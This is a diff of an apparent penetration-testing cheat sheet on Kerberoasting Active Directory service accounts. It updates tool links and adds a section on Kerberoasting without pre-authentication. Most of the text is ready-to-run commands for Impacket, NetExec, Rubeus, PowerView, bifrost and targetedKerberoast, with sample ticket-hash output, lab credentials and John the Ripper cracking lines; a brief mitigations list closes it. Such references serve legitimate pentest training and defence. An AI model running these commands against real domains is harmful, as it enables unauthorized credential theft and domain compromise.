@@ -4,10 +4,10 @@
 
 Any valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.
 
-* [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket Suite
+* [SecureAuthCorp/impacket/GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket Suite
 
   ```powershell
-  $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+  GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
 
   Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
@@ -18,15 +18,15 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
   $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84fd2
   ```
 
-* netexec Module
+* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
 
   ```powershell
-  $ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt
+  netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt
   LDAP        10.0.2.11       389    dc01           [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False)
   LDAP        10.0.2.11       389    dc01           $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9
   ```
 
-* [Rubeus](https://github.com/GhostPack/Rubeus)
+* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
 
   ```powershell
   # Stats
@@ -49,19 +49,19 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
   Rubeus.exe kerberoast /rc4opsec
   ```
 
-* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+* [PowerShellMafia/PowerSploit/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 
   ```powershell
   Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
   ```
 
-* [bifrost](https://github.com/its-a-feature/bifrost) on **macOS** machine
+* [its-a-feature/bifrost](https://github.com/its-a-feature/bifrost) on **macOS** machine
 
   ```powershell
   ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
   ```
 
-* [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
+* [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
 
   ```powershell
   # for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), 
@@ -82,7 +82,15 @@ Then crack the ticket using the correct hashcat mode (`$krb5tgs$23`= `etype 23`)
 ./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt
 ```
 
-**Mitigations**:
+## Kerberoasting Without Pre-Authentication
+
+> If an attacker knows of an account for which pre-authentication isn’t required (i.e. an ASREProastable account), as well as one (or multiple) service accounts to target, a Kerberoast attack can be attempted without having to control any Active Directory account (since pre-authentication won’t be required).
+
+```ps1
+netexec ldap 10.10.10.10 -u username -p '' --no-preauth-targets users.txt --kerberoasting output.txt
+```
+
+## Mitigations
 
 * Have a very long password for your accounts with SPNs (> 32 characters)
 * Make sure no users have SPNs
